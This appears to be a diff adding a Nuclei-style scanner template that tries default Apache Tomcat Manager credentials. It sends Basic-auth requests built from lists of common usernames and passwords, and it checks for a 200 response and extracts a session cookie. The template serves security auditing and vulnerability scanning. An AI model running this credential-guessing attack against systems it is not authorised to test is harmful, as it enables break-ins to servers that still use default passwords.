@@ -1,0 +1,76 @@
+id: tomcat-manager-login
+info:
+  author: pdteam
+  name: tomcat-manager-default-password
+  severity: high
+  tags: tomcat-manager
+http:
+  - raw:
+      - |
+        GET /manager/html HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Basic {{base64(username + ':' + password)}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0
+        Accept-Language: en-US,en;q=0.9
+    attack: sniper
+    stop-at-first-match: true
+    matchers:
+      - status:
+          - 200
+        type: status
+      - type: word
+        words:
+          - Apache Tomcat
+    extractors:
+      - type: regex
+        name: cookie
+        internal: true
+        part: header
+        regex:
+          - 'JSESSIONID\..*=([a-z0-9.]+)'
+    matchers-condition: and
+    payloads:
+      username:
+        - ADMIN
+        - QCC
+        - admin
+        - both
+        - cxsdk
+        - demo
+        - j2deployer
+        - manager
+        - ovwebusr
+        - role
+        - role1
+        - root
+        - server_admin
+        - tomcat
+        - xampp
+      password:
+        - ADMIN
+        - OvW*busr1
+        - Password1
+        - QLogic66
+        - admanager
+        - admin
+        - adrole1
+        - adroot
+        - ads3cret
+        - adtomcat
+        - advagrant
+        - changethis
+        - demo
+        - j2deployer
+        - kdsxc
+        - manager
+        - owaspbwa
+        - password
+        - password1
+        - r00t
+        - role1
+        - root
+        - s3cret
+        - tomcat
+        - toor
+        - vagrant
+        - xampp
